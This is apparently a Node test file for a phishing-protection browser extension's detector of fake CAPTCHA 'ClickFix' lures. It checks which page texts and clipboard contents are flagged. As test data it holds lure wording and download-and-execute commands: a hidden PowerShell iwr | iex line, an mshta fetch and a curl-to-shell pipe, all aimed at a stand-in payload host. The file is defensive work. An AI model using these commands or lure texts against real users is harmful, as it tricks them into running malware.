/* Rules for the fake CAPTCHA ("ClickFix") signal (riskEngine.js).
   Run: node --test tests/fake-captcha.test.mjs */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import vm from "node:vm";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const load = (ctx, file) => vm.runInNewContext(readFileSync(resolve(ROOT, file), "utf8"), ctx);
const ctx = { window: {} };
ctx.globalThis = ctx;
load(ctx, "extension/lib/publicSuffix.js");
load(ctx, "extension/riskEngine.js");
const engine = ctx.window.PhishCleanRiskEngine;
const detect = engine.detectFakeCaptcha;

const textOf = (file) => readFileSync(resolve(ROOT, "tests", file), "utf8")
  .replace(/<title>[\s\S]*?<\/title>/g, "")
  .replace(/<(style|script)[\s\S]*?<\/\1>/g, "")
  .replace(/<!--[\s\S]*?-->/g, "")
  .replace(/<[^>]+>/g, " ")
  .replace(/&[a-z#0-9]+;/gi, " ");

const LURE = "Verify you are human. I'm not a robot. Verification steps: 1. Press Windows + R 2. Press CTRL + V 3. Press Enter";
const PS = 'powershell -w h -nop -c "iwr https://payload.example/v.ps1 | iex"';
const DECOY = PS + " # I am not a robot - reCAPTCHA Verification ID: 4823";
const LONG = "Slice the onions thinly and cook them slowly in butter until golden. ".repeat(120);

/* ── Flags ── */
const lures = {
  "text only: Win+R, Ctrl+V and a robot check": [LURE, ""],
  "fixture page, before anything is copied": [textOf("test-fake-captcha.html"), ""],
  "copied command + robot check": ["I'm not a robot", PS],
  "copied command + Win+R on a short page": ["Press Win+R and paste to fix the display error", PS],
  "decoy comment in the clipboard, on a long hacked page": [LONG, DECOY],
  "long hacked page with the lure overlay and a copied command": [LONG + LURE, PS],
  "Win+X / Terminal variant": ["Human verification. Press Windows + X, open Terminal (Admin), paste with Ctrl+V", ""],
  "File Explorer address bar variant (FileFix)": ["Robot check: open File Explorer, click the address bar, press Ctrl+V and Enter", ""],
  "macOS Terminal variant": ["Verify you are human: press Cmd + Space, type Terminal, press Cmd + V and Return", ""],
  "⊞ glyph": ["Captcha verification: press ⊞ + R then Ctrl + V", ""],
  "mshta command": ["I'm not a robot", "mshta https://payload.example/c.hta"],
  "curl piped to a shell on macOS": ["Verify you are human", 'curl -s https://payload.example/x | sh -c "$(cat)"'],
};
for (const [name, [text, clip]] of Object.entries(lures)) {
  test(`fake captcha flags: ${name}`, () => assert.equal(detect(text, clip), true));
}

/* ── Does not flag ── */
const fine = {
  "install docs: copied command + 'open a terminal and paste'": [textOf("test-install-docs.html"), "curl -fsSL https://cli.example/install.sh | bash"],
  "install docs: copied PowerShell one-liner": [textOf("test-install-docs.html"), 'powershell -ExecutionPolicy ByPass -c "irm https://cli.example/install.ps1 | iex"'],
  "real reCAPTCHA, nothing copied": ["I'm not a robot. reCAPTCHA. Privacy - Terms", ""],
  "help page: Win+R to open regedit, no robot check": ["Press Win + R, type regedit and press Enter. Paste the key path into the address bar.", ""],
  "article quoting the steps": [
    "The page says 'press Windows + R' and then 'press Ctrl + V'. The fake 'I'm not a robot' box is a lure. " + LONG, ""],
  "long article describing the lure": [LONG + LURE, ""],
  "captcha docs with a curl example on a long page": [LONG + " To verify a reCAPTCHA token, POST it with curl.", "curl -X POST https://captcha.example/siteverify"],
  "copied text that is not a command": [LURE.replace("Windows + R", "the button"), "Order #4823 - thank you"],
};
for (const [name, [text, clip]] of Object.entries(fine)) {
  test(`fake captcha does not flag: ${name}`, () => assert.equal(detect(text, clip), false));
}

test("isShellCommand", () => {
  assert.equal(engine.isShellCommand(PS), true);
  assert.equal(engine.isShellCommand("cmd /c start calc"), true);
  assert.equal(engine.isShellCommand("hello world"), false);
  assert.equal(engine.isShellCommand(""), false);
});

test("fake captcha alerts on its own and stays on for free users", () => {
  const s = engine.SIGNALS.FAKE_CAPTCHA;
  assert.equal(engine.scoreSignals(new Set([s]), true).shouldAlert, true);
  assert.equal(engine.scoreSignals(new Set([s]), false).shouldAlert, true);
  assert.equal(engine.scoreSignals(new Set([s]), false).level, "danger");
  assert.equal(engine.FREE_SIGNALS.size, 5, "free-check count is quoted in the extension copy");
});
